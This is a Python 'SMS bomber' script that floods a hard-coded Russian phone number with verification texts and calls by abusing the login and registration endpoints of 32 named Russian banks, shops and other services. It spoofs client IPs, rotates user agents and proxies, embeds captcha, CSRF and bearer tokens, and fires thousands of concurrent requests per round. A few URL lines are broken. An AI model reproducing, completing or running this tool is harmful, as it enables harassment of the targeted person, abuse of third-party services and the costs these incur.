import asyncio
import aiohttp
import random
import string
import time
from dataclasses import dataclass, field
from typing import Callable, Literal

TARGET_PHONE = "+79612421307"
CONCURRENCY = 100
ROUNDS = 50


def _rand_str(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _normalize_phone(phone: str, with_plus: bool = False) -> str:
    digits = "".join(ch for ch in phone if ch.isdigit())
    return f"+{digits}" if with_plus else digits


OPERATORS = {
    "Билайн": ["903", "905", "906", "909", "960", "961", "962", "963", "964", "965", "966", "967", "968"],
    "МТС": ["910", "911", "912", "913", "914", "915", "916", "917", "918", "919", "980", "981", "982", "983", "984",
            "985", "986", "987", "988", "989"],
    "МегаФон": ["920", "921", "922", "923", "924", "925", "926", "927", "928", "929", "930", "931", "932", "933", "934",
                "936", "937", "938", "939"],
    "Tele2": ["900", "901", "902", "904", "908", "950", "951", "952", "953", "958", "977", "991", "992", "993", "994",
              "995", "996", "997", "998", "999"],
}


def get_operator(phone: str) -> str:
    clean = "".join(c for c in phone if c.isdigit())
    if len(clean) == 11 and clean[0] in ("7", "8"):
        prefix = clean[1:4]
        for op, prefixes in OPERATORS.items():
            if prefix in prefixes:
                return op
    return "Неизвестно"


def sms_json(phone: str) -> dict:
    return {"phone": _normalize_phone(phone), "text": "Код подтверждения", "nonce": _rand_str()}


def sms_form(phone: str) -> dict:
    return {"msisdn": _normalize_phone(phone), "message": "Код подтверждения"}


def call_json(phone: str) -> dict:
    return {"msisdn": _normalize_phone(phone), "action": "call"}


Kind = Literal["sms", "call"]


@dataclass
class Service:
    name: str
    kind: Kind
    url: str
    method: str
    build_payload: Callable[[str], dict]
    headers: dict = field(default_factory=dict)


# ВСТАВЬ СЮДА РЕАЛЬНЫЕ ЭНДПОИНТЫ (найденные через краулер или API-шлюзы)
SERVICES: list[Service] = [  # 1. МТС Банк
    Service("mts_bank", "sms", "https://sso.mtsbank.ru/api/v2/login", "POST",
            lambda p: {"login": p}, {"Content-Type": "application/json"}),

    # 2. Winelab (винный магазин)
    Service("winelab", "sms", "https://www.winelab.ru/confirmation/sendByPhone", "GET",
            lambda p: {"number": p}, {"X-Requested-With": "XMLHttpRequest"}),

    # 3. Profi.ru
    Service("profi", "sms", "https://spb.profi.ru/graphql", "POST",
            lambda p: {"query": "mutation { authStrategyStart(type: PHONE, initialState: {phoneNumber: \"+"+p+"\"}) { result { __typename } } }"},
            {"Content-Type": "application/json", "x-app-id": "PROFI"}),

    # 4. Читай-город (тут нужен фейковый токен капчи, который в оригинале)
    Service("chitai_gorod", "sms", "https://web-gate.chitai-gorod.ru/api/v1/auth/code", "POST",
            lambda p: {"phone": p, "cgsing": {"type": "reCaptcha", "payload": {"token": "03AKH6MREL... (токен из ориги)", "action": "getSMSCode", "version": "rv3"}}},
            {"Content-Type": "application/json"}),

    # 5. Sunlight (ювелирка)
    Service("sunlight", "sms", "https://api.sunlight.net/v3/customers/authorization/", "POST",
            lambda p: {"phone": "+"+p, "flashcall": True},
            {"Content-Type": "application/json", "X-Requested-With": "SunlightFrontendApp"}),

    # 6. Citilink (Ситилинк)
    Service("citilink", "sms", f"https://www.citilink.ru/registration/confirm/phone/+{p}/", "POST",
            lambda p: {}, {"X-Requested-With": "XMLHttpRequest"}),

    # 7. Raiffeisen Bank
    Service("raiffeisen", "sms", "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms", "POST",
            lambda p: {"number": p}, {"Content-Type": "application/json"}),

    # 8. Madyart
    Service("madyart", "sms", "https://madyart.ru/local/aut.php", "POST",
            lambda p: {"wct_reg_phone": p, "wct_reg_fio": "Василий"},
            {"Content-Type": "application/x-www-form-urlencoded"}),

    # 9. Growfood
    Service("growfood", "sms", "https://admin.growfood.pro/api/personal-cabinet/v2_0/authentication/send-sms", "POST",
            lambda p: {"client": {"phone": p, "cityId": 2}}, {"Content-Type": "application/json"}),

    # 10. Letu (Лэтуаль)
    Service("letu", "sms", "https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU", "POST",
            lambda p: {"captcha": "", "phoneNumber": f"+7 ({p[1:4]}) {p[4:7]}-{p[7:9]}-{p[9:11]}"},
            {"Content-Type": "application/json"}),

    # 11. Evraz Market
    Service("evraz", "sms", "https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms", "POST",
            lambda p: {"userPhone": p, "captchaCode": "", "captchaWord": ""},
            {"Content-Type": "application/x-www-form-urlencoded"}),

    # 12. ABC.ru
    Service("abc", "sms", "https://abc.ru/clientapi/v1/user/phone-sms/", "POST",
            lambda p: {"phone": "+"+p, "country_id": 1, "scenario": "registration", "_csrf": "oqqL7n8CPs-K8TyRRe11rFxa0lUmFcqXKMx-KWjt6-mQ_f2DLWVR9r2EW_t3rCHraQ2BYWd2g8RwvQ1cKaaviw=="},
            {"Content-Type": "application/json"}),

    # 13. Московский метрополитен
    Service("mosmetro", "sms", "https://auth.mosmetro.ru/api/auth/login/sms", "POST",
            lambda p: {"login": p, "returnUrl": "/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522"},
            {"Content-Type": "application/json"}),

    # 14. Uteka.ru
    Service("uteka", "sms", "https://spb.uteka.ru/rpc/?method=auth.GetCode", "POST",
            lambda p: {"jsonrpc": "2.0", "id": 8, "method": "auth.GetCode", "params": {"phone": p[1:], "mustExist": False, "sendRealSms": True}},
            {"Content-Type": "application/json", "platform": "Desktop"}),

    # 15. Elementaree
    Service("elementaree", "sms", "https://api-new.elementaree.ru/graphql", "POST",
            lambda p: {"operationName": "phoneVerification", "variables": {"phone": p}, "query": "mutation phoneVerification($phone: String!) { phoneVerification(phone: $phone) { success } }"},
            {"Content-Type": "application/json", "Authorization": "Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn"}),

    # 16. Lenta (Лента)
    Service("lenta", "sms", "https://moscow.online.lenta.com/jrpc", "POST",
            lambda p: {"method": "authCodeSend", "params": {"phone": p}, "jsonrpc": "2.0", "id": 12},
            {"Content-Type": "text/plain", "Client": "angular_web_0.0.2"}),

    # 17. Auchan (Ашан)
    Service("auchan", "sms", "https://www.auchan.ru/v1/cmd/clientprofile/checkphone", "GET",
            lambda p: {}, {"phone": p, "source": "4"}),

    # 18. Victoria Group (Виктория)
    Service("victoria", "sms", "https://lk.victoria-group.ru/identity/registration", "POST",
            lambda p: '{"MobilePhone":"+'+p+'","CardNumber":null,"AgreeToTerms":1,"AllowNotification":0,"DeviceId":"gl3llll8mih00hxy1xg6j23c"}',
            {"Content-Type": "application/json"}),

    # 19. Связной
    Service("svyaznoy", "sms", f"https://www.svyaznoy.ru/api/v2/sms-verification-code/{p[1:]}", "POST",
            lambda p: {}, {"X-Requested-With": "XMLHttpRequest"}),

    # 20. OneTwoTrip
    Service("onetwotrip", "sms", "https://www.onetwotrip.com/_auth/profile/phone/with-confirm", "PATCH",
            lambda p: {"phone": "+"+p, "reseller": ""}, {"Content-Type": "application/json"}),

    # 21. X5 (Пятерочка/Перекресток)
    Service("x5", "sms", "https://id.x5.ru/auth/realms/ssox5id/protocol/openid-connect/registrations", "GET",
            lambda p: {}, {"loginHint": p}),

    # 22. Zaymigo (МФО)
    Service("zaymigo", "sms", "https://borrow.zaymigo.com/rpc/v1", "POST",
            lambda p: {"jsonrpc": "2.0", "id": "123", "method": "create", "params": {"borrower": {"phone": "+"+p, "email": "test@test.ru"}}},
            {"Content-Type": "application/json"}),

    # 23. Adengi (МФО)
    Service("adengi", "sms", "https://adengi.ru/rest/v1/registration/code/send", "POST",
            lambda p: {"email": "test@test.ru", "phone": p, "via": "sms", "timestamp": 1667680555},
            {"Content-Type": "application/json"}),

    # 24. Uteka (Крым)
    Service("uteka_krym", "sms", "https://krym.uteka.ru/rpc/?method=auth.GetCode", "POST",
            lambda p: {"jsonrpc": "2.0", "id": 6, "method": "auth.GetCode", "params": {"phone": p[1:], "mustExist": False, "sendRealSms": True}},
            {"Content-Type": "application/json", "platform": "Desktop"}),

    # 25. Zdorov.ru
    Service("zdorov", "sms", "https://zdorov.ru/backend/api/customer/confirm", "POST",
            lambda p: {"phone": p, "deviceId": "6adada4b-b83b-406a-ac5b-b6101d282cdc", "term": 2},
            {"Content-Type": "application/json"}),

    # 26. Sokolov (Ювелирка)
    Service("sokolov", "sms", "https://sokolov.ru/api/v4/profile/user/send-code", "POST",
            lambda p: {"data": {"type": "login", "attributes": {"phone": p, "uid_captcha": None, "code_captcha": None}}},
            {"Content-Type": "application/vnd.api+json"}),

    # 27. TSUM (ЦУМ)
    Service("tsum", "sms", "https://api.tsum.ru/v2/authorize/request-sms", "POST",
            lambda p: {"data": {"type": "requestSMS", "attributes": {"phone": "+"+p}}},
            {"Content-Type": "application/json"}),

    # 28. Megafon TV
    Service("megafon_tv", "sms", "https://bmp.megafon.tv/api/v10/auth/register/msisdn", "POST",
            lambda p: {"msisdn": "+"+p, "password": "200147200147"},
            {"Content-Type": "application/json"}),

    # 29. Auto.ru
    Service("autoru", "sms", "https://auth.auto.ru/-/ajax/auth/", "POST",
            lambda p: {"items": [{"path": "auth/login-or-register", "params": {"phone": p, "retpath": "https://auto.ru/"}}]},
            {"Content-Type": "application/json", "x-requested-with": "XMLHttpRequest"}),

    # 30. Shopping Live
    Service("shoppinglive", "sms", "https://www.shoppinglive.ru/phone-verification/send-code", "POST",
            lambda p: {"mobilePhone": p[1:], "CSRFToken": "00bc3ff8-f081-483d-ab0e-bb026785114f"},
            {"Content-Type": "application/x-www-form-urlencoded"}),

    # 31. Sravni.ru
    Service("sravni", "sms", "https://my.sravni.ru/signin/code", "POST",
            lambda p: {"__RequestVerificationToken": "CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41SftrzCGJ0NjJWXj04eT9whWjnEE37nwuELHlp42n3cj3_8E36WbypiKwpbcwu7ykP40eOWeONUwI7q_hRaxaTJ2pIqKFx5bB3tWc72gaHTsA2npAdpsIh2OA", "phone": "+"+p, "returnUrl": "/user/profile"},
            {"Content-Type": "application/x-www-form-urlencoded"}),

    # 32. Vprok.ru (Перекресток)
    Service("vprok", "sms", "https://www.vprok.ru/as_send_pin", "POST",
            lambda p: {"phone": p}, {"Content-Type": "application/x-www-form-urlencoded"}),

]

PROXIES: list[str] = [
    # "http://user:pass@ip:port",
]


def _pick_proxy() -> str | None:
    return random.choice(PROXIES) if PROXIES else None


def _rand_ip() -> str:
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]


class Bomber:
    def __init__(self, phone: str, concurrency: int = 100, rounds: int = 50):
        self.phone = phone
        self.concurrency = concurrency
        self.rounds = rounds
        self.sem = asyncio.Semaphore(concurrency)
        self.ok = 0
        self.fail = 0
        self._lock = asyncio.Lock()

    async def _fire(self, session: aiohttp.ClientSession, svc: Service) -> None:
        async with self.sem:
            payload = svc.build_payload(self.phone)
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "application/json, text/plain, */*",
                "X-Forwarded-For": _rand_ip(),
                "X-Real-IP": _rand_ip(),
                **svc.headers,
            }

            try:
                async with session.request(
                        svc.method, svc.url,
                        json=payload if svc.method == "POST" and "Content-Type" in svc.headers and "json" in
                                        svc.headers["Content-Type"] else None,
                        data=payload if svc.method == "POST" and "Content-Type" not in svc.headers or (
                                svc.method == "POST" and "form" in svc.headers.get("Content-Type", "")) else None,
                        params=payload if svc.method == "GET" else None,
                        headers=headers,
                        proxy=_pick_proxy(),
                        timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    async with self._lock:
                        if 200 <= resp.status < 300:
                            self.ok += 1
                        else:
                            self.fail += 1
            except Exception:
                async with self._lock:
                    self.fail += 1

    async def run(self) -> None:
        if not SERVICES:
            print(f"[!] Список SERVICES пуст.")
            print(f"[!] Цель: {self.phone} (Оператор: {get_operator(self.phone)})")
            print("[*] Добавь рабочие API эндпоинты в список SERVICES, чтобы начать атаку.")
            return

        print(f"[*] Цель: {self.phone} | Оператор: {get_operator(self.phone)}")
        print(f"[*] Потоков: {self.concurrency} | Раундов: {self.rounds} | Сервисов: {len(SERVICES)}")
        print("-" * 50)

        connector = aiohttp.TCPConnector(limit=self.concurrency * 2, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            start_time = time.time()
            for r in range(self.rounds):
                tasks = [
                    asyncio.create_task(self._fire(session, svc))
                    for svc in SERVICES
                    for _ in range(self.concurrency)
                ]
                await asyncio.gather(*tasks)

                elapsed = time.time() - start_time
                rps = (self.ok + self.fail) / elapsed if elapsed > 0 else 0
                print(f"[Round {r + 1}/{self.rounds}] OK: {self.ok} | FAIL: {self.fail} | RPS: {rps:.1f}")

        print("-" * 50)
        print(f"[+] Завершено. Всего OK: {self.ok} | Всего FAIL: {self.fail}")


if __name__ == "__main__":
    import sys

    # Фикс для Windows, чтобы asyncio не падал с ошибкой Event Loop
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    try:
        asyncio.run(Bomber(TARGET_PHONE, CONCURRENCY, ROUNDS).run())
    except KeyboardInterrupt:
        print("\n[!] Прервано пользователем.")